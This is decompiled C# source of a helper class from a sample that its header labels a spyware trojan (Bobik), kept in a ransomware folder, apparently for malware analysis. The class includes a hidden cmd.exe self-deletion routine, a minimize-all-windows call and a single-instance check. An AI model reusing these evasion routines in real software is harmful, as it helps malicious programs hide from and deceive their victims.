// Decompiled with JetBrains decompiler
// Type: setup.Runner
// Assembly: setup, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 95C225EB-6E6B-4374-8E73-8564F911E43A
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Spy.MSIL.Bobik.gen-c7f353c4ca722da712da454317e9d00b77c9b6cf6194b47009dbd67517cf2abc.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace setup
{
  internal class Runner
  {
    private const int WM_COMMAND = 273;
    private const int MIN_ALL = 419;

    public static void SelfRemove()
    {
      string location = Assembly.GetExecutingAssembly().Location;
      Process.Start(new ProcessStartInfo()
      {
        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + location + "\"",
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe"
      });
      Environment.Exit(0);
    }

    public static void StartTaskMgr()
    {
      try
      {
        Process.Start("taskmgr.exe");
      }
      catch
      {
      }
    }

    public static bool CheckSingle() => Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1;

    public static void HideAllWindows() => Runner.SendMessage(Runner.FindWindow("Shell_TrayWnd", (string) null), 273, (IntPtr) 419, IntPtr.Zero);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SendMessage(
      IntPtr hWnd,
      int Msg,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("shfolder.dll", CharSet = CharSet.Auto)]
    private static extern int SHGetFolderPath(
      IntPtr hwndOwner,
      int nFolder,
      IntPtr hToken,
      int dwFlags,
      StringBuilder lpszPath);
  }
}
